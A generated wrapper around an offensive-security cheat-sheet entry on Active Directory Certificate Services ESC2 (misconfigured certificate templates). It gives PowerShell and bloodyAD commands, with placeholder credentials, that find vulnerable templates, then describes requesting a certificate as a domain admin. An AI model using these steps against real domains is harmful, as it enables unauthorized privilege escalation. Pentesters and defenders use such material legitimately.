---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Certificate ESC2

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adcs-esc02` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc02.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Requirements

## Preserved Body

````markdown
## ESC2 - Misconfigured Certificate Templates

**Requirements**

* Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)

**Exploitation**

* Find template

  ```ps1
  PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'
  # or
  python bloodyAD.py -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=megacorp,DC=local' --filter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))'
  ```

* Request a certificate specifying the `/altname` as a domain admin like in [ESC1 - Misconfigured Certificate Templates](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-esc01/).

## References
````

## Source Verification

[source record](../../sources/internalallthethings/active-directory-certificate-esc2.md)

## Evidence Excerpt

````text
_body: "# Active Directory - Certificate ESC2\n\n## ESC2 - Misconfigured Certificate Templates\n\n**Requirements**\n\n* Allows\
\ requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)\n\n\
**Exploitation**\n\n* Find template\n\n  ```ps1\n  PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))'\
\ -SearchBase 'CN=Configuration,DC=megacorp,DC=local'\n  # or\n  python bloodyAD.py -u john.doe -p 'Password123!' --host\
\ 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=megacorp,DC=local' --filter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))'\n\
\  ```\n\n* Request a certificate specifying the `/altname` as a domain admin like in [ESC1 - Misconfigured Certificate\
\ Templates](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-esc01/).\n\n## Referen...
````
